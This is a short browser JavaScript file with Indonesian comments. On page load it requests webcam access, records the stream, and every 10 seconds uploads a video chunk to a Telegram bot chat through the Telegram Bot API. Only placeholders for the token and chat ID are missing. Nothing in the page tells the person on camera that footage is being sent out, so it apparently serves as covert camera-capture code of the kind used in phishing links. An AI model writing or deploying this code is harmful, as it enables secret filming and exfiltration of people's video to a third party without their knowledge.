const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");

async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        sendToTelegram(stream);
    } catch (error) {
        console.error("Gagal mengakses kamera:", error);
    }
}

async function sendToTelegram(stream) {
    const botToken = "YOUR_BOT_TOKEN";
    const chatId = "YOUR_CHAT_ID";
    const url = `https://api.telegram.org/bot${botToken}/sendVideo`;

    const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });

    mediaRecorder.ondataavailable = async (event) => {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("video", event.data, "stream.webm");

        try {
            await fetch(url, { method: "POST", body: formData });
            console.log("Video terkirim ke Telegram");
        } catch (error) {
            console.error("Gagal mengirim video ke Telegram:", error);
        }
    };

    mediaRecorder.start();
    setInterval(() => mediaRecorder.requestData(), 10000); // Kirim video setiap 10 detik
}

startCamera();